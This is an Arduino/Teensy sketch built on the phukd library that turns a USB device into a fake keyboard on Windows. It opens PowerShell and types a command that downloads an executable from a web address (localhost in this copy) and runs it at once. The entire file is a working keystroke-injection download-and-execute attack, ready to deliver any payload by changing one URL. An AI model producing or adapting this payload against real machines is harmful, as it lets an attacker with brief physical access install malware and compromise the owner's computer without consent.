#include <phukdlib.h>
void setup() {
  delay(3000);
  CommandAtRunBarMSWIN("powershell.exe");
  delay(2000);
  Keyboard.print("$down = New-Object System.Net.WebClient; $url = 'http://localhost:8080/putty.exe'; $file = 'mess1.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
  delay(2000);
  Keyboard.set_key1(KEY_ENTER); 
  Keyboard.send_now();    
  Keyboard.set_key1(0);
  Keyboard.send_now();  
}
void loop(){}
